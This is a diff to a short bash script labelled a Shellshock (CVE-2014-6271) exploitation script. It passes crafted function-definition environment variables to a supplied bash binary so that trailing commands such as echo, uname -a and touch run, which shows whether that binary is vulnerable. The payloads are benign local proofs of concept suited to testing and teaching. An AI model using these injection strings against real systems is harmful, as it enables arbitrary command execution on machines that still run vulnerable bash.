@@ -1,11 +1,10 @@
 #!/bin/bash
-# Shellshock CVE-2014-6271 Exploitation Script
+# Shellshock Exploitation Script
 
-BASH_BIN=${1:-/bin/bash}
+BASH_BIN=${1:-/bin/bash} # Uses the vulnerable-bash binary passed in. Otherwise, uses the default bash.
 
-$BASH_BIN --version | head -1
-env x1='() { :; }; echo VULNERABLE' $BASH_BIN -c 'echo Test 1'
+env x='() { :; }; echo VULNERABLE' $BASH_BIN -c "echo Hello"
 
-env x2='() { :; }; uname -a' $BASH_BIN -c 'echo Test 2'
+env x2='() { :; }; touch tmp' $BASH_BIN -c 'echo Test'
 
-env x3='() { :; }; touch ./shellshock_poc; echo hacked > ./shellshock_poc' $BASH_BIN -c 'echo Can you see a ./shellshock_poc?'
+env x3='() { :; }; uname -a' $BASH_BIN -c ':'
